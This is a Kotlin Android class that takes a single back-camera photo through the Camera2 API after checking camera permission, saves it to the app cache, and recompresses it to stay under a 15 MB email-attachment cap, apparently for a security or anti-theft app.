package com.example.securityservices

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Size
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream

/**
 * Captures a single JPEG photo from the phone's main (back) camera using the Camera2 API and writes
 * it to a file in the app's cache directory. The file is handed to [capture]'s callback and is meant
 * to be deleted by the caller once it has been sent.
 *
 * The capture is asynchronous: the callback runs on the camera's own background thread and receives
 * null when the camera cannot be opened or the photo could not be written.
 *
 * @author Chu Quang Khai (Khai Chu)
 */
class PhotoCapture(
    private val context: Context,
    private val cameraManager: CameraManager
) {

    /** Opens the camera, takes one photo, closes the camera and hands the JPEG file to [onResult]. */
    fun capture(onResult: (File?) -> Unit) {
        if (context.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            onResult(null)
            return
        }
        val cameraId = pickCameraId()
        if (cameraId == null) {
            onResult(null)
            return
        }

        val thread = HandlerThread("SecurityServicesPhoto")
        thread.start()
        val handler = Handler(thread.looper)

        var device: CameraDevice? = null
        var session: CameraCaptureSession? = null
        var reader: ImageReader? = null
        var completed = false

        fun cleanup() {
            try {
                session?.close()
            } catch (e: Exception) {
            }
            try {
                reader?.close()
            } catch (e: Exception) {
            }
            try {
                device?.close()
            } catch (e: Exception) {
            }
            thread.quitSafely()
        }

        fun complete(file: File?) {
            if (completed) return
            completed = true
            cleanup()
            onResult(file)
        }

        try {
            val size = chooseSize(cameraId)
            val outputFile = File(context.cacheDir, "security_photo_${System.currentTimeMillis()}.jpg")
            val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            reader = imageReader
            imageReader.setOnImageAvailableListener({ r ->
                val image = r.acquireLatestImage()
                if (image == null) {
                    complete(null)
                    return@setOnImageAvailableListener
                }
                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    FileOutputStream(outputFile).use { it.write(enforceMaxBytes(bytes)) }
                    complete(outputFile)
                } catch (e: Exception) {
                    complete(null)
                } finally {
                    try {
                        image.close()
                    } catch (e: Exception) {
                    }
                }
            }, handler)

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    device = camera
                    try {
                        camera.createCaptureSession(
                            listOf(imageReader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(configured: CameraCaptureSession) {
                                    session = configured
                                    try {
                                        val builder = camera.createCaptureRequest(
                                            CameraDevice.TEMPLATE_STILL_CAPTURE
                                        )
                                        builder.addTarget(imageReader.surface)
                                        if (autofocusModes(cameraId)
                                                .contains(CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        ) {
                                            builder.set(
                                                CaptureRequest.CONTROL_AF_MODE,
                                                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE
                                            )
                                        }
                                        builder.set(CaptureRequest.JPEG_QUALITY, 95.toByte())
                                        configured.capture(builder.build(), null, handler)
                                    } catch (e: Exception) {
                                        complete(null)
                                    }
                                }

                                override fun onConfigureFailed(configured: CameraCaptureSession) {
                                    complete(null)
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        complete(null)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    complete(null)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    complete(null)
                }
            }

            cameraManager.openCamera(cameraId, stateCallback, handler)

            // Safety net: never leave the camera open if the phone never answers.
            handler.postDelayed({ complete(null) }, CAPTURE_TIMEOUT_MS)
        } catch (e: Exception) {
            complete(null)
        }
    }

    /** The back camera when there is one, otherwise the first camera the phone reports. */
    private fun pickCameraId(): String? = try {
        val ids = cameraManager.cameraIdList
        ids.firstOrNull { id ->
            cameraManager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
        } ?: ids.firstOrNull()
    } catch (e: Exception) {
        null
    }

    private fun autofocusModes(cameraId: String): IntArray = try {
        cameraManager.getCameraCharacteristics(cameraId)
            .get(CameraCharacteristics.CONTROL_AF_AVAILABLE_MODES) ?: IntArray(0)
    } catch (e: Exception) {
        IntArray(0)
    }

    /** Prefers a high-resolution (up to 25 MP) JPEG for better quality, capped at 15 MB on disk. */
    private fun chooseSize(cameraId: String): Size {
        return try {
            val map = cameraManager.getCameraCharacteristics(cameraId)
                .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG)?.toList().orEmpty()
            if (sizes.isEmpty()) return Size(4032, 3024)
            sizes.filter { it.width.toLong() * it.height <= 25_000_000L }
                .maxByOrNull { it.width.toLong() * it.height }
                ?: sizes.minByOrNull { it.width.toLong() * it.height }!!
        } catch (e: Exception) {
            Size(4032, 3024)
        }
    }

    /**
     * Returns [bytes] unchanged when already within [MAX_PHOTO_BYTES]; otherwise recompresses
     * (lower quality, then smaller dimensions) until the photo fits. Centralizes the 15 MB cap
     * so the email attachment never exceeds ~20 MB after base64 wrapping (~25 MB provider limit).
     */
    private fun enforceMaxBytes(bytes: ByteArray): ByteArray {
        if (bytes.size.toLong() <= MAX_PHOTO_BYTES) return bytes
        var decoded: Bitmap? = null
        try {
            decoded = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return bytes
            var scale = 1.0
            var quality = 92
            while (true) {
                val out = ByteArrayOutputStream()
                if (scale >= 1.0) {
                    decoded.compress(Bitmap.CompressFormat.JPEG, quality, out)
                } else {
                    val w = (decoded.width * scale).toInt().coerceAtLeast(1)
                    val h = (decoded.height * scale).toInt().coerceAtLeast(1)
                    val small = Bitmap.createScaledBitmap(decoded, w, h, true)
                    try {
                        small.compress(Bitmap.CompressFormat.JPEG, quality, out)
                    } finally {
                        small.recycle()
                    }
                }
                val compressed = out.toByteArray()
                if (compressed.size.toLong() <= MAX_PHOTO_BYTES) return compressed
                if (quality > 70) {
                    quality -= 8
                } else if (scale > 0.4) {
                    scale *= 0.8
                    quality = 85
                } else {
                    return compressed
                }
            }
        } catch (e: OutOfMemoryError) {
            return bytes
        } catch (e: Exception) {
            return bytes
        } finally {
            try {
                decoded?.recycle()
            } catch (e: Exception) {
            }
        }
    }

    private companion object {
        const val CAPTURE_TIMEOUT_MS = 8_000L
        /** Largest photo kept on disk (15 MB); base64 email overhead adds ~37%. */
        const val MAX_PHOTO_BYTES = 15L * 1024L * 1024L
    }
}
